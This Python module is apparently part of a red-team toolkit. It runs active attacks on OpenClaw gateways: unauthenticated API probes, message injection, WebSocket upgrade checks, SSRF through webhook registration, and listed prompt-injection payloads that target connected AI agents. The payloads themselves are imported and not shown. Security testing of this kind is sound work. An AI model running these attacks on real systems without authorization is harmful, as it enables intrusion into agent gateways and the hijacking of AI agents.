"""
OpenClaw gateway attacker module for authorized red-team engagements.

THIS MODULE PERFORMS ACTIVE ATTACKS AGAINST OPENCLAW GATEWAY INSTANCES.
It must ONLY be used against systems for which you have EXPLICIT WRITTEN
AUTHORIZATION. Unauthorized use may violate the Computer Fraud and Abuse Act,
the Computer Misuse Act, and equivalent laws worldwide.

Usage:
    attacker = OpenClawAttacker(authorized=True)
    report = await attacker.attack("192.168.1.10", port=18789, mode="safe")
"""

from __future__ import annotations

import json
import logging
import time
from datetime import datetime, timezone
from urllib.parse import urljoin

import httpx

from ..models.openclaw_result import (
    OpenClawAttackReport,
    OpenClawAttackResult,
    OpenClawScanResult,
    OpenClawVulnSeverity,
)
from ..utils.openclaw_payloads import (
    API_AUTH_BYPASS_PAYLOADS,
    DM_PROMPT_INJECTION_PAYLOADS,
    MESSAGE_INJECTION_PAYLOADS,
    SSRF_WEBHOOK_PAYLOADS,
    WEBSOCKET_PROBE_PATHS,
)

from ..exceptions import AuthorizationRequired

from ._base import BaseAttacker


from ..utils.constants import USER_AGENT
logger = logging.getLogger(__name__)


class OpenClawAttacker(BaseAttacker):
    """
    Active attack module for OpenClaw gateway instances.

    Requires authorized=True. Will refuse all operations if not authorized.
    """

    _MODULE_NAME = "OPENCLAW"

    def __init__(self, authorized: bool = False, judge: object | None = None) -> None:
        super().__init__(authorized=authorized, judge=judge)

    async def attack(
        self,
        target: str,
        port: int = 18789,
        mode: str = "safe",
        headers: dict[str, str] | None = None,
        timeout: float = 15.0,
        use_tls: bool = False,
        scan_result: OpenClawScanResult | None = None,
    ) -> OpenClawAttackReport:
        """
        Execute attack sequences against an OpenClaw gateway.

        Args:
            target:      Hostname or IP of the OpenClaw gateway.
            port:        Gateway port (default 18789).
            mode:        "safe" (passive API probes only) or
                         "deep" (full suite including WS, SSRF, message injection).
            headers:     Extra HTTP headers (e.g. Authorization token).
            timeout:     Per-request timeout in seconds.
            use_tls:     Use HTTPS.
            scan_result: Optional prior scan result to avoid re-scanning.

        Returns:
            OpenClawAttackReport with all attack results.
        """
        scheme = "https" if use_tls else "http"
        base_url = f"{scheme}://{target}:{port}"
        start = time.monotonic()

        report = OpenClawAttackReport(
            target=target,
            port=port,
            authorized=True,
            mode=mode,
            scan_result=scan_result,
        )

        extra_headers = {
            "User-Agent": f"{USER_AGENT} (authorized red-team)",
            **(headers or {}),
        }

        async with httpx.AsyncClient(
            headers=extra_headers,
            timeout=httpx.Timeout(timeout),
            follow_redirects=True,
            verify=False,  # noqa: S501 — intentional for security scanning
            trust_env=False,
        ) as client:

            # Always run: unauthenticated API probes
            api_results = await self._attack_api_endpoints(client, base_url)
            report.attack_results.extend(api_results)

            if mode == "deep":
                # Message injection via unauthenticated API
                msg_results = await self._attack_message_injection(client, base_url)
                report.attack_results.extend(msg_results)

                # WebSocket upgrade probes
                ws_results = await self._attack_websocket(client, base_url)
                report.attack_results.extend(ws_results)

                # SSRF via webhook endpoint
                ssrf_results = await self._attack_ssrf_webhooks(client, base_url)
                report.attack_results.extend(ssrf_results)

                # LLM-assisted prompt injection payloads (informational in this module)
                pi_results = self._generate_prompt_injection_report()
                report.attack_results.extend(pi_results)

        report.attack_duration = time.monotonic() - start
        report.attacked_at = datetime.now(timezone.utc)

        # Optional LLM enrichment
        if self._judge and getattr(self._judge, "provider", None):
            self._enrich_with_llm(report)

        return report

    # ------------------------------------------------------------------
    # Attack sequence implementations
    # ------------------------------------------------------------------

    async def _attack_api_endpoints(
        self, client: httpx.AsyncClient, base_url: str
    ) -> list[OpenClawAttackResult]:
        """Probe API endpoints for unauthenticated access."""
        results: list[OpenClawAttackResult] = []

        for payload in API_AUTH_BYPASS_PAYLOADS:
            path = payload["path"]
            url = urljoin(base_url, path)
            result = OpenClawAttackResult(
                attack_id=payload["id"],
                description=payload["description"],
                severity=OpenClawVulnSeverity(payload["severity"]),
                payload_sent=f"{payload['method']} {path}",
            )
            try:
                resp = await client.request(
                    payload["method"],
                    url,
                    json=payload.get("body"),
                )
                response_text = ""
                try:
                    raw = resp.content[:4096]
                    body = json.loads(raw)
                    response_text = json.dumps(body)[:500]
                except Exception:  # noqa: BLE001
                    response_text = resp.text[:500]

                result.response_snippet = response_text

                if resp.status_code in (200, 201, 202):
                    lower_resp = response_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower_resp:
                            result.succeeded = True
                            result.evidence = (
                                f"HTTP {resp.status_code}: endpoint {path} returned "
                                f"sensitive indicator '{indicator}' without authentication."
                            )
                            break
                    if not result.succeeded:
                        result.succeeded = True
                        result.evidence = (
                            f"HTTP {resp.status_code}: endpoint {path} is accessible "
                            "without authentication."
                        )
                    logger.debug("API probe %s succeeded (HTTP %s)", path, resp.status_code)

            except httpx.RequestError as exc:
                result.error = str(exc)
                logger.debug("API probe %s error: %s", path, exc)

            results.append(result)

        return results

    async def _attack_message_injection(
        self, client: httpx.AsyncClient, base_url: str
    ) -> list[OpenClawAttackResult]:
        """Attempt to inject messages via unauthenticated API endpoints."""
        results: list[OpenClawAttackResult] = []

        for payload in MESSAGE_INJECTION_PAYLOADS:
            path = payload["path"]
            url = urljoin(base_url, path)
            result = OpenClawAttackResult(
                attack_id=payload["id"],
                description=payload["description"],
                severity=OpenClawVulnSeverity(payload["severity"]),
                payload_sent=f"POST {path}: {json.dumps(payload.get('body', {}))}",
            )
            try:
                resp = await client.post(url, json=payload.get("body"))
                response_text = ""
                try:
                    raw = resp.content[:4096]
                    body = json.loads(raw)
                    response_text = json.dumps(body)[:400]
                except Exception:  # noqa: BLE001
                    response_text = resp.text[:400]

                result.response_snippet = response_text

                if resp.status_code in (200, 201, 202):
                    lower_resp = response_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower_resp:
                            result.succeeded = True
                            result.evidence = (
                                f"HTTP {resp.status_code}: message injection endpoint "
                                f"accepted unauthenticated POST with indicator '{indicator}'."
                            )
                            break
                    logger.debug("Message injection %s: HTTP %s", path, resp.status_code)

            except httpx.RequestError as exc:
                result.error = str(exc)

            results.append(result)

        return results

    async def _attack_websocket(
        self, client: httpx.AsyncClient, base_url: str
    ) -> list[OpenClawAttackResult]:
        """Probe WebSocket endpoints for unauthenticated upgrade acceptance."""
        results: list[OpenClawAttackResult] = []

        for path in WEBSOCKET_PROBE_PATHS:
            url = urljoin(base_url, path)
            result = OpenClawAttackResult(
                attack_id=f"OCL-ATK-WS-{path.replace('/', '_')}",
                description=f"WebSocket upgrade probe on {path}",
                severity=OpenClawVulnSeverity.HIGH,
                payload_sent=f"WS UPGRADE {path}",
            )
            try:
                ws_headers = {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    "Sec-WebSocket-Version": "13",
                }
                resp = await client.get(url, headers=ws_headers)
                result.response_snippet = f"HTTP {resp.status_code}"

                if resp.status_code == 101:
                    result.succeeded = True
                    result.evidence = (
                        f"WebSocket upgrade accepted at {path} without authentication "
                        "(HTTP 101 Switching Protocols)."
                    )

            except httpx.RequestError as exc:
                result.error = str(exc)

            results.append(result)

        return results

    async def _attack_ssrf_webhooks(
        self, client: httpx.AsyncClient, base_url: str
    ) -> list[OpenClawAttackResult]:
        """Test SSRF via webhook registration endpoint."""
        results: list[OpenClawAttackResult] = []

        for payload in SSRF_WEBHOOK_PAYLOADS:
            path = payload["path"]
            url = urljoin(base_url, path)
            result = OpenClawAttackResult(
                attack_id=payload["id"],
                description=payload["description"],
                severity=OpenClawVulnSeverity(payload["severity"]),
                payload_sent=f"POST {path}: {json.dumps(payload.get('body', {}))}",
            )
            try:
                resp = await client.post(url, json=payload.get("body"))
                response_text = ""
                try:
                    body = resp.json()
                    response_text = json.dumps(body)[:400]
                except Exception:  # noqa: BLE001
                    response_text = resp.text[:400]

                result.response_snippet = response_text

                if resp.status_code in (200, 201, 202):
                    lower_resp = response_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower_resp:
                            result.succeeded = True
                            result.evidence = (
                                f"HTTP {resp.status_code}: SSRF webhook registered "
                                f"with internal URL without validation. Indicator: '{indicator}'."
                            )
                            break

            except httpx.RequestError as exc:
                result.error = str(exc)

            results.append(result)

        return results

    def _generate_prompt_injection_report(self) -> list[OpenClawAttackResult]:
        """
        Return informational records for DM-based prompt injection payloads.

        These payloads must be delivered through an actual messaging channel
        (Telegram, WhatsApp, Discord, etc.), not via the HTTP API, so this
        module reports them as actionable next steps rather than executing them.
        """
        results: list[OpenClawAttackResult] = []
        for payload in DM_PROMPT_INJECTION_PAYLOADS:
            results.append(
                OpenClawAttackResult(
                    attack_id=payload["id"],
                    description=(
                        f"{payload['description']} — manual delivery required "
                        "via connected messaging channel."
                    ),
                    severity=OpenClawVulnSeverity(payload["severity"]),
                    payload_sent=payload["payload"],
                    succeeded=False,
                    evidence=(
                        "This payload must be sent via the actual messaging channel "
                        "(Telegram DM, WhatsApp, Discord, etc.). "
                        "Successful injection would require the target to have "
                        "an open DM policy (OCL-ADV-002)."
                    ),
                    error="Manual delivery required — not executed automatically.",
                )
            )
        return results

    def _enrich_with_llm(self, report: OpenClawAttackReport) -> None:
        """Use LLM judge to build an attack-path narrative for succeeded attacks."""
        if not self._judge:
            return
        succeeded = report.successful_attacks
        if not succeeded:
            return
        try:
            summary = "; ".join(f"{r.attack_id}:{r.description}" for r in succeeded[:5])
            verdict = self._judge.evaluate(
                category="OpenClaw attack-path",
                probe=summary,
                response=f"{len(succeeded)} attack(s) succeeded",
            )
            reason = verdict.get("reason", "")
            if reason:
                succeeded[0].evidence += f" [LLM analysis: {reason}]"
        except Exception as exc:  # noqa: BLE001
            logger.debug("LLM enrichment error: %s", exc)
